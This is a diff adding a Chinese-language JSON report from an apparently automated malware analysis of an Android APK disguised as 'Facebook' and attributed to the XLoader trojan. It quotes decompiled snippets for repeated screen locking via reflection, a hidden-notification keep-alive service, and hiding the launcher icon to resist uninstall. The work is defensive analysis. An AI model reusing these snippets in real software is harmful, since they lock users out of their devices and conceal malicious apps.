@@ -1,0 +1,118 @@
+{
+  "APK信息": {
+    "文件名": "e1fb10b714420f23f1bb09b6c4c55b674b6efd93685ee7d1d4574c7fa8b39a94.apk",
+    "sha256": "e1fb10b714420f23f1bb09b6c4c55b674b6efd93685ee7d1d4574c7fa8b39a94",
+    "包名": "trghj.asdf.cvxebdf",
+    "应用名": "Facebook",
+    "是否恶意": true,
+    "风险等级": "高",
+    "分析耗时(秒)": 113.6
+  },
+  "行为列表": [
+    {
+      "行为": "ransomware",
+      "中文名": "勒索软件",
+      "MITRE": "T1430,T1460",
+      "置信度": "suspected",
+      "子行为": [
+        {
+          "子行为": "device_lock",
+          "中文名": "设备锁屏",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "lockNow"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\a;",
+          "method_signature": "if(i2 >= 70)",
+          "malicious_behavior": "ransomware",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "while (true) {\n    int i2 = i;\n    if (i2 >= 70) {\n        return;\n    }\n    try {\n        systemService.getClass().getMethod(\"lockNow\", new Class[0]).invoke(systemService, new Object[0]);\n        Thread.sleep(99L);\n    } catch (Exception e) {\n        e.printStackTrace();\n    }\n    i = i2 + 1;\n}",
+          "malicious_code_snippet_context": "              public void run() {\n                  int i = 0;\n                  super.run();\n>>>                 while (true) {\n>>>                     int i2 = i;\n>>>                     if (i2 >= 70) {\n>>>                         return;\n>>>                     }\n>>>                     try {\n>>>                         systemService.getClass().getMethod(\"lockNow\", new Class[0]).invoke(systemService, new Object[0]);\n>>>                         Thread.sleep(99L);\n>>>                     } catch (Exception e) {\n>>>                         e.printStackTrace();\n>>>                     }\n>>>                     i = i2 + 1;\n>>>                 }\n              }\n          }.start();\n      }",
+          "behavior_description": "该代码在子线程中循环70次，每次通过Java反射机制调用系统服务（DevicePolicyManager）的lockNow()方法立即锁定设备屏幕，每次间隔99毫秒。高频反复锁屏是典型的勒索软件设备锁定手法，使用户解锁后立即被再次锁屏，无法正常使用设备，从而勒索赎金或瘫痪手机。采用反射方式调用lockNow()是为了规避静态特征检测。数据流向：systemService（DevicePolicyManager实例）→ 反射invoke调用lockNow()反复强制锁定屏幕。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "persistence",
+      "中文名": "持久化",
+      "MITRE": "T1444",
+      "置信度": "suspected",
+      "子行为": [
+        {
+          "子行为": "foreground_service",
+          "中文名": "前台服务保活",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "startForeground"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\udas\\dgMainService;",
+          "method_signature": "if(Build.VERSION.SDK_INT < 18)",
+          "malicious_behavior": "persistence",
+          "behavior_type": "grayware",
+          "risk_level": "中",
+          "malicious_code_snippet": "if (Build.VERSION.SDK_INT < 18) {\n    startForeground(a, new Notification());\n    return;\n}\nNotification.Builder builder = new Notification.Builder(this);\nbuilder.setContentTitle(\"KeepAppAlive\");\nbuilder.setContentText(\"DaemonService is runing...\");\nstartForeground(a, builder.build());\nstartService(new Intent(this, gdCancelNoticeService.class));",
+          "malicious_code_snippet_context": "          super.onCreate();\n          SharedPreferences sharedPreferences = getSharedPreferences(\"pref\", 0);\n          sharedPreferences.edit().putInt(\"create\", sharedPreferences.getInt(\"create\", 0) + 1).apply();\n>>>         if (Build.VERSION.SDK_INT < 18) {\n>>>             startForeground(a, new Notification());\n>>>             return;\n>>>         }\n>>>         Notification.Builder builder = new Notification.Builder(this);\n>>>         builder.setSmallIcon(R.mipmap.icon);\n>>>         builder.setContentTitle(\"KeepAppAlive\");\n>>>         builder.setContentText(\"DaemonService is runing...\");\n>>>         startForeground(a, builder.build());\n          startService(new Intent(this, (Class<?>) gdCancelNoticeService.class));\n      }\n  ",
+          "behavior_description": "该Service在onCreate中通过startForeground()将自身提升为前台服务以规避系统回收实现进程保活：在Android 4.3以下(SDK<18)使用空Notification启动前台服务，用户完全无感知；在更高版本则先以'KeepAppAlive/DaemonService is runing...'通知获得前台优先级，随后启动gdCancelNoticeService取消通知栏图标，形成'前台优先级+隐藏通知'的经典DaemonService双服务保活方案。数据流向：Build.VERSION.SDK_INT(系统版本检测)→startForeground(空通知)/startService(取消通知服务)，属于隐蔽持久化保活机制，为已确认的XLoader间谍/银行木马样本的其他恶意模块提供持续存活的进程环境。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "icon_hiding",
+      "中文名": "图标隐藏",
+      "MITRE": "",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "setComponentEnabledSetting"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\iouqwe\\gdsActivity;",
+          "method_signature": "run()",
+          "malicious_behavior": "icon_hiding",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "gdsActivity.this.getPackageManager().setComponentEnabledSetting(new ComponentName(gdsActivity.this.getPackageName(), gdsActivity.class.getName()), 2, 1);",
+          "malicious_code_snippet_context": "              @Override // java.lang.Runnable\n              public void run() {\n                  try {\n>>>                     gdsActivity.this.getPackageManager().setComponentEnabledSetting(new ComponentName(gdsActivity.this.getPackageName(), gdsActivity.class.getName()), 2, 1);\n                  } catch (Exception e) {\n                      e.printStackTrace();\n                  }",
+          "behavior_description": "在主 Activity 的 onCreate 中，通过匿名 Runnable 调用 PackageManager.setComponentEnabledSetting，将应用自身的主 Activity 组件设置为禁用状态（参数 2 即 COMPONENT_ENABLED_STATE_DISABLED，参数 1 即 DONT_KILL_APP），使应用在首次启动后立即从桌面启动器中隐藏图标，用户无法再找到并卸载该应用。结合同方法中注册的 gdAdminReceiver（设备管理器）实现持久化驻留。数据流向：getPackageName() 与 gdsActivity.class.getName() 获取自身组件名（source）→ setComponentEnabledSetting 传入 COMPONENT_ENABLED_STATE_DISABLED 禁用主组件（sink），完成图标隐藏。该行为是 XLoader 银行木马典型的隐蔽驻留与对抗卸载手法。",
+          "glm_analyzed": true
+        }
+      ]
+    }
+  ],
+  "覆盖范围": {
+    "静态分析": "完整",
+    "动态分析": "未执行",
+    "方法引用分析": "完整",
+    "JADX反编译": "完整",
+    "LLM语义分析": "已执行",
+    "LLM交叉验证": "已执行",
+    "验证模型": "qwen3.8",
+    "局限性": [
+      "C2服务器.是否活跃: 需动态分析",
+      "C2服务器.轮询间隔(秒): 需动态分析"
+    ]
+  }
+}
